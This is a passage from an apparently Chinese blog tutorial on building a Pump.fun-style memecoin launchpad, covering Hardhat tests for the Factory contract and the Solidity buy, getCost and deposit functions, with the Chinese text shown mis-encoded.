class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; loadFixture &#125; = <span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox/network-helpers&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Factory&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FEE</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.01&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">deployFactoryFixture</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//è·å–è´¦æˆ·</span></span><br><span class="line">        <span class="keyword">const</span> [deployer, creator, buyer] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">        <span class="comment">//ç¼–è¯‘å¹¶å‡†å¤‡éƒ¨ç½²åˆçº¦</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">Factory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Factory&quot;</span>);</span><br><span class="line">        <span class="comment">//éƒ¨ç½²åˆçº¦</span></span><br><span class="line">      <span class="comment">//é»˜è®¤æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·éƒ¨ç½²åˆçº¦å³deployer</span></span><br><span class="line">      <span class="comment">//await Factory.connect(deployer).deploy(FEE);</span></span><br><span class="line">        <span class="keyword">const</span> factory = <span class="keyword">await</span> <span class="title class_">Factory</span>.<span class="title function_">deploy</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        <span class="comment">//åˆ›å»ºtoken</span></span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(creator).<span class="title function_">create</span>(<span class="string">&quot;Pump&quot;</span>, <span class="string">&quot;PUM&quot;</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">FEE</span>&#125;);</span><br><span class="line">        <span class="comment">//ç¡®ä¿äº¤æ˜“å®Œæˆï¼Œå†æ‰§è¡Œåç»­ä»£ç </span></span><br><span class="line">        <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–ç¬¬ä¸€ä¸ªtokenï¼Œtokensä¸ºtokenæ•°ç»„</span></span><br><span class="line">        <span class="keyword">const</span> tokenAddress = <span class="keyword">await</span> factory.<span class="title function_">tokens</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">const</span> token = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;Token&quot;</span>, tokenAddress);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123; factory, token, deployer, creator ,buyer&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;Deployment&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the fee&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> factory.<span class="title function_">fee</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,deployer &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> factory.<span class="title function_">owner</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(deployer.<span class="property">address</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&quot;Creating&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">owner</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the creator&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token,creator &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">creator</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(creator.<span class="property">address</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should set the supply&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span> totalSupply = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1000000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">            <span class="title function_">expect</span>(<span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>())).<span class="property">to</span>.<span class="title function_">equal</span>(totalSupply);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should create the sale&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory,token,creator&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">            <span class="keyword">const</span>  count = <span class="keyword">await</span> factory.<span class="title function_">totalTokens</span>();</span><br><span class="line">            <span class="title function_">expect</span>(count).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">getTokenSale</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//console.log(sale);</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">token</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">creator</span>).<span class="property">to</span>.<span class="title function_">equal</span>(creator.<span class="property">address</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">sold</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">raised</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æµ‹è¯•åˆçº¦çš„éƒ¨ç½²ï¼Œå¯¹äº<code>deployFactoryFixture</code>å‡½æ•°ï¼š</p><p>ä½¿ç”¨<code>ethers.getSigners()</code>å»è·å–ç”¨æˆ·ï¼Œ<code>deployerã€creator</code>åˆ†åˆ«ä¸ºåˆçº¦çš„éƒ¨ç½²è€…å’Œåˆ›å»ºè€…ï¼Œ<code>buyer</code>ä¸ºtokençš„ä¹°å®¶ã€‚ç¼–è¯‘å¹¶éƒ¨ç½²åˆçº¦ï¼Œç”¨<code>creator</code>ç”¨æˆ·å»äº¤æ˜“ï¼Œåˆ›å»ºä¸€ä¸ªåç§°ä¸º<code>Pump</code>ï¼Œç¬¦å·ä¸º<code>PUM</code>çš„ä»£å¸(<code>token</code>)ã€‚ç„¶åï¼Œè·å–åˆ›å»ºçš„<code>token</code>çš„åœ°å€ã€‚</p><p>éƒ¨ç½²éƒ¨åˆ†æµ‹è¯•ï¼š</p><p>æµ‹è¯•éƒ¨ç½²çš„åˆçº¦çš„<code>fee</code>å’Œ<code>deployer</code>æ˜¯å¦æ­£ç¡®ã€‚<code>Factory.deploy(FEE);</code>é»˜è®¤æ˜¯ä½¿ç”¨ç¬¬ä¸€ä¸ªç”¨æˆ·å»éƒ¨ç½²åˆçº¦ï¼Œæ­£å¸¸åº”è¯¥æ˜¯<code>Factory.connect(deployer).deploy(FEE);</code>å»éƒ¨ç½²åˆçº¦ã€‚</p><p>åˆ›å»º<code>token</code>éƒ¨åˆ†æµ‹è¯•ï¼š</p><p>ï¼ˆ1ï¼‰æµ‹è¯•<code>token.owner()</code>å’Œ<code>factory.getAddress()</code>æ˜¯å¦ç›¸ç­‰ã€‚<code>token.owner()</code>æ˜¯<code>token</code>çš„åˆ›å»ºè€…ï¼Œ<code>factory.getAddress()</code>æ˜¯<code>factory</code>åˆçº¦éƒ¨ç½²çš„åœ°å€ï¼Œå› ä¸ºåœ¨<code>Token.sol</code>ä¸­ï¼Œåˆ›å»º<code>token</code>æ—¶ï¼Œä½¿ç”¨çš„æ˜¯<code>msg.sender</code>ï¼Œå³è°ƒç”¨è¯¥åˆçº¦çš„åœ°å€ï¼Œå…¶è¢«èµ‹å€¼ç»™äº†<code>owner</code>ï¼Œ<code>Factory</code>åˆçº¦è°ƒç”¨äº†<code>Token</code>åˆçº¦ï¼Œæ‰€ä»¥äºŒè€…æ˜¯ç›¸ç­‰ã€‚</p><p>ï¼ˆ2ï¼‰æµ‹è¯•<code>creator</code>å’Œ<code>totalSupply</code>æ˜¯å¦å’Œéƒ¨ç½²æ—¶ä¸€è‡´ã€‚</p><p>ï¼ˆ3ï¼‰åˆ›å»º<code>token</code>æ—¶éœ€è¦æ”¯ä»˜ä¸€å®šçš„<code>fee</code>ï¼Œè¿™ä¸ª<code>fee</code>æ˜¯å­˜å‚¨åœ¨<code>factory</code>åˆçº¦ä¸­çš„ï¼Œåˆ›å»º<code>token</code>ååˆ¤æ–­åˆçº¦ä¸­çš„ä½™é¢å’Œ<code>fee</code>æ˜¯å¦ç›¸ç­‰ã€‚</p><p>ï¼ˆ4ï¼‰æµ‹è¯•<code>token</code>çš„å”®å–ä¿¡æ¯ã€‚</p><p>æµ‹è¯•å®Œæˆã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250216175651190.png" alt="image-20250216175651190"></p><h3 id="Buyå‡½æ•°-ä»£å¸é”€å”®">Buyå‡½æ•°(ä»£å¸é”€å”®)</h3><h4 id="å‡½æ•°ä»£ç -2">å‡½æ•°ä»£ç </h4><p>ä»£ç è¯¦ç»†å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function buy(address _token, uint256 _amount) external payable&#123;</span><br><span class="line">    TokenSale storage sale = tokenToSale[_token];</span><br><span class="line">    //æ£€æŸ¥æ¡ä»¶</span><br><span class="line">    require(sale.isOpen == true, &quot;Factory: Buying closed&quot;);</span><br><span class="line">    require(_amount &gt;= 1 ether, &quot;Factory: Amount too low&quot;);</span><br><span class="line">    require(_amount &lt;= 10000 ether, &quot;Factory: Amount exceeded&quot;);</span><br><span class="line"></span><br><span class="line">    //è®¡ç®—ä¸€ä¸ªtokençš„ä»·æ ¼åŸºäºè´­ä¹°çš„æ€»é‡</span><br><span class="line">    uint256 cost = getCost(sale.sold);</span><br><span class="line">    uint256 price = cost * (_amount / 10 ** 18);</span><br><span class="line">    //ç¡®ä¿è¶³å¤Ÿçš„ETHå‘é€</span><br><span class="line">    require(msg.value &gt;= price, &quot;Factory: Insufficient ETH received&quot;);</span><br><span class="line">    //æ›´æ–°sale</span><br><span class="line">    sale.sold += _amount;</span><br><span class="line">    sale.raised += price;</span><br><span class="line">    //åˆ¤æ–­ç­¹é›†ç›®æ ‡æ˜¯å¦è¾¾æˆ</span><br><span class="line">    if(sale.sold &gt;= TOKEN_LIMIT || sale.raised &gt;= TARGET)&#123;</span><br><span class="line">        //å…³é—­é”€å”®</span><br><span class="line">        sale.isOpen = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Token(_token).transfer(msg.sender, _amount);</span><br><span class="line">    //è§¦å‘Buyäº‹ä»¶</span><br><span class="line">    emit Buy(_token, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸º<code>external payable</code>çš„ï¼Œè¯´æ˜åªèƒ½å¤–éƒ¨è°ƒç”¨ä¸”æ˜¯å¯ä»¥åœ¨è°ƒç”¨æ—¶å‘é€<code>ETH</code>çš„ã€‚å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º<code>_token</code>å’Œ<code>_amount</code>ï¼Œå³<code>token</code>çš„åœ°å€å’Œè´­ä¹°çš„æ•°é‡ã€‚</p><p>é¦–å…ˆï¼Œä½¿ç”¨ <code>storage</code> å…³é”®å­—ï¼Œå…è®¸ç›´æ¥ä¿®æ”¹å­˜å‚¨çŠ¶æ€ï¼Œå¹¶é€šè¿‡<code>token</code>çš„åœ°å€è·å–å¯¹åº”çš„å”®å–ä¿¡æ¯ã€‚ç„¶åæ£€æŸ¥<code>token</code>çš„å”®å–ä¿¡æ¯æ˜¯å¦ç¬¦åˆæƒ…å†µã€‚</p><p>ç„¶åï¼Œæ ¹æ®<code>token</code>çš„å”®å–æƒ…å†µè®¡ç®—<code>token</code>çš„ä»·æ ¼ã€‚ä½¿ç”¨åˆ°äº†<code>getCost</code>å‡½æ•°ï¼Œè‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function getCost(uint256 _sold) public pure returns (uint256)&#123;</span><br><span class="line">    uint256 floor = 0.0001 ether;</span><br><span class="line">    uint256 step = 0.0001 ether;</span><br><span class="line">    uint256 increment = 10000 ether;</span><br><span class="line">    uint256 cost = (step * (_sold / increment)) + floor;</span><br><span class="line">    return cost;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡ï¼Œåˆ¤æ–­è´­ä¹°è€…çš„èµ„é‡‘æ˜¯å¦å¤§äºä»·æ ¼ï¼Œè‹¥æ»¡è¶³ï¼Œåˆ™å¯è´­ä¹°ï¼Œç„¶åæ›´æ–°<code>token</code>çš„å”®å–ä¿¡æ¯ï¼Œè´­ä¹°é‡å’Œç­¹é›†çš„èµ„é‡‘å‡å¢åŠ ã€‚æ›´æ–°åï¼Œåˆ¤æ–­<code>token</code>çš„å”®å–ä¿¡æ¯æ˜¯å¦è¾¾åˆ°ä¸Šé™çš„è¦æ±‚ï¼Œè‹¥æ»¡è¶³ï¼Œåˆ™å…³é—­å”®å–çŠ¶æ€ã€‚</p><p>æœ€åï¼Œå‘è´­ä¹°è€…<code>buyer</code>è½¬è´¦è´­ä¹°çš„<code>token</code>ã€‚è½¬è´¦å®Œæˆåè§¦å‘<code>Buy</code>äº‹ä»¶ã€‚</p><h4 id="åˆçº¦æµ‹è¯•-2">åˆçº¦æµ‹è¯•</h4><p>jsä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">buyTokenFixture</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; factory, token, creator , buyer &#125; = <span class="keyword">await</span> <span class="title function_">deployFactoryFixture</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¹°token</span></span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(buyer).<span class="title function_">buy</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>(), <span class="variable constant_">AMOUNT</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">COST</span>&#125;);</span><br><span class="line">    <span class="comment">//ç¡®ä¿äº¤æ˜“å®Œæˆï¼Œå†æ‰§è¡Œåç»­ä»£ç </span></span><br><span class="line">    <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line">    <span class="keyword">return</span> &#123; factory, token, creator, buyer&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Buying&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="comment">//buyerä¹°tokenï¼Œå°†ETHè½¬å…¥åˆ°åˆçº¦ä¸­ï¼Œæ£€æŸ¥åˆçº¦æ”¶åˆ°çš„ETH</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span> + <span class="variable constant_">COST</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//buyerä¹°tokenï¼Œæ£€æŸ¥buyeræ”¶åˆ°çš„token</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update token balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;token, buyer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(buyer.<span class="property">address</span>);</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">AMOUNT</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//æ›´æ–°token sale</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update token sale&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory, token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">sold</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">AMOUNT</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">raised</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">COST</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should increase base cost&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory, token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(sale.<span class="property">sold</span>);</span><br><span class="line">            <span class="comment">//soldä¸º10000,å¸¦å…¥getCostè®¡ç®— 0.0001 + 0.0001 = 0.0002</span></span><br><span class="line">            <span class="title function_">expect</span>(cost).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">equal</span>(ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.0002&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>å¯¹äº<code>buyTokenFixture</code>å‡½æ•°ï¼š</p><p>è¯¥å‡½æ•°éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå¹¶ä½¿ç”¨<code>buyer</code>ç”¨æˆ·è´­ä¹°<code>token</code>ï¼Œè¾“å…¥è´­ä¹°çš„æ•°é‡<code>AMOUNT</code>å’Œè½¬å…¥çš„è´¹ç”¨<code>COST</code>ï¼Œå®Œæˆ<code>token</code>çš„è´­ä¹°ã€‚</p><p>è´­ä¹°é€»è¾‘éƒ¨åˆ†æµ‹è¯•ï¼š</p><p>ï¼ˆ1ï¼‰æ ¸å¯¹è´­ä¹°<code>token</code>åçš„åˆçº¦èµ„é‡‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line"><span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line"><span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span> + <span class="variable constant_">COST</span>);</span><br></pre></td></tr></table></figure><p><code>ethers.provider.getBalance</code>è·å–åˆçº¦çš„èµ„é‡‘æ•°é‡ï¼Œåˆ¤æ–­æ˜¯å¦ç­‰äº<code>FEE + COST</code>ã€‚åˆ›å»º<code>token</code>è½¬å…¥<code>factory</code>åˆçº¦<code>FEE</code>ï¼Œè´­ä¹°<code>token</code>åˆèŠ±è´¹äº†<code>COST</code>ï¼Œæœ€ååˆçº¦çš„èµ„é‡‘ä¸º<code>FEE + COST</code>ã€‚</p><p>ï¼ˆ2ï¼‰æ ¸å¯¹<code>buyer</code>çš„<code>token</code>æ•°é‡æ˜¯å¦æ­£ç¡®ï¼Œè§ä»£ç ã€‚</p><p>ï¼ˆ3ï¼‰æ ¸å¯¹<code>token</code>çš„å”®å–ä¿¡æ¯ï¼Œè§ä»£ç ã€‚</p><p>ï¼ˆ4ï¼‰æ ¸å¯¹é”€å”®çš„ä»·æ ¼æ˜¯å¦ç¬¦åˆé€»è¾‘ã€‚åŸºæœ¬å•ä½ä¸º<code>ether</code>ï¼Œ<code>1 ether</code> ç­‰äº<code>1åé¢18ä¸ª0</code>ã€‚é”€å”®çš„æ•°é‡ä¸º<code>10000 ether</code>ï¼Œå¸¦å…¥åˆ°<code>getCost</code>å‡½æ•°å¯å¾—ï¼Œè´­ä¹°çš„ä»·æ ¼åº”è¯¥ä¸º<code>0.0002</code> ETHã€‚</p><h3 id="Depositå‡½æ•°-èµ„é‡‘ç®¡ç†">Depositå‡½æ•°(èµ„é‡‘ç®¡ç†)</h3><h4 id="å‡½æ•°ä»£ç -3">å‡½æ•°ä»£ç </h4><p>ä»£ç è¯¦ç»†å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function deposit(address _token) external&#123;</span><br><span class="line">    //ä»£å¸é”€å”®ç»“æŸåèµ„é‡‘ç»“ç®—çš„é€»è¾‘</span><br><span class="line">    //å‰©ä½™çš„tokens å’Œ ETHè½¬ç»™creator</span><br><span class="line">    Token token = Token(_token);</span><br><span class="line">    TokenSale memory sale = tokenToSale[_token];</span><br><span class="line"></span><br><span 